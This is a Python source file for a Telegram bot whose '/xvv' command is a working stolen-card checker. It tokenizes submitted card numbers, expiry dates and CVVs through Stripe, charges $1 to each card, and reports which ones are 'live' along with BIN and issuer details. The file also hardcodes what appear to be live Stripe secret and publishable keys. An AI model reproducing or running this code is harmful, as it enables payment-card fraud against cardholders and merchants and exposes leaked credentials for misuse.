import time
import re
import asyncio
import requests
import json
from EQUROBOT import app
from pyrogram import Client, filters
import aiohttp
from requests.auth import HTTPBasicAuth
from collections import defaultdict
import traceback
from requests.exceptions import RequestException

user_request_times = defaultdict(list)

ADMIN_IDS = [7427691214, 7044783841, 6757745933]

pk = "pk_live_51PpRSsGjCe9g75GWVyLe9Kjw0UVSQahdxJdHNez4xJlvXl1Dy5gOhU6yBx7wAaJJWMp4i7cJ6etPM6RpgMrBKskE00aPjIrsEh"
sk = "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"

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                else:
                    return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"


async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    start_time = time.time()
    message_text = message.text
    parts = message_text.split(" ", 1)

    cards = parts[1]
    card_list = cards.split(",")
    results = []

    for card in card_list:
        split = card.split("|")
        cc, mes, ano, cvv = (split + [""] * 4)[:4]

        if not all([cc, mes, ano, cvv]):
            results.append(f"❌ **Invalid card details** for `{card}`")
            continue

        token_data = {
            "card[number]": cc,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "card[cvc]": cvv,
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/tokens",
                data=token_data,
                headers={
                    "Authorization": f"Bearer {pk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Error with card `{cc}`: {str(e)}**")
            continue

        bin_info = await get_bin_info(cc[:6])
        brand, card_type, level, bank, country, flag = bin_info

        if response.status_code != 200:
            results.append(
                f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n"
                f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: SK Based 1$ XVV\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: SK KEY REVOKED\n\n"
                f"𝗜𝗻𝗳𝗼: {brand.upper()} - {card_type.upper()} - {level.upper()}\n"
                f"𝗜𝘀𝘀𝘂𝗲𝗿: {bank.upper()} 🏛\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}\n\n"
                f"𝗧𝗶𝗺𝗲: `{time.time() - start_time}` Seconds\n"
                f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
            )
            continue

        token_data = response.json()
        token_id = token_data.get("id", "")

        if not token_id:
            results.append(f"❌ **Token creation failed** for `{card}`")
            continue

        charge_data = {
            "amount": 100,
            "currency": "usd",
            "source": token_id,
            "description": "Charge for product/service",
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/charges",
                data=charge_data,
                headers={
                    "Authorization": f"Bearer {sk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Charge error** for `{cc}`: {str(e)}")
            continue

        chares = response.json()
        elapsed_time = round(time.time() - start_time, 2)

        if response.status_code == 200 and chares.get("status") == "succeeded":
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
            resp = "Charged 1$ 🔥"
        elif "Your card's security code is incorrect." in json.dumps(chares):
            status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲✅"
            resp = "Your card's security code is incorrect."
        elif "insufficient funds" in json.dumps(chares):
            status = "𝗖𝗩𝗩 𝗟𝗶𝘃𝗲✅"
            resp = "Your Card has Insufficient funds."
        else:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱❌"
            resp = chares.get("error", {}).get(
                "decline_code", chares.get("error", {}).get("message", "Unknown error")
            )

        results.append(
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mes}|{ano}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ SK Based 1$ XVV\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {elapsed_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )

    return "\n".join(results)


def check_user_limit(user_id):
    if user_id in ADMIN_IDS:
        return True, 0

    current_time = time.time()

    user_request_times[user_id] = [
        t for t in user_request_times[user_id] if current_time - t < 20
    ]

    if len(user_request_times[user_id]) >= 3:
        time_diff = 20 - (current_time - user_request_times[user_id][0])
        return False, round(time_diff, 3)

    user_request_times[user_id].append(current_time)
    return True, 0


@app.on_message(filters.command("xvv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id

    allowed, remaining_time = check_user_limit(user_id)

    if not allowed:
        await message.reply(
            f"🚫 **Anti-Spam** Detected! Please try again after {remaining_time} seconds."
        )
        return

    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return
    if not card_pattern.match(card_info):
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return
    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
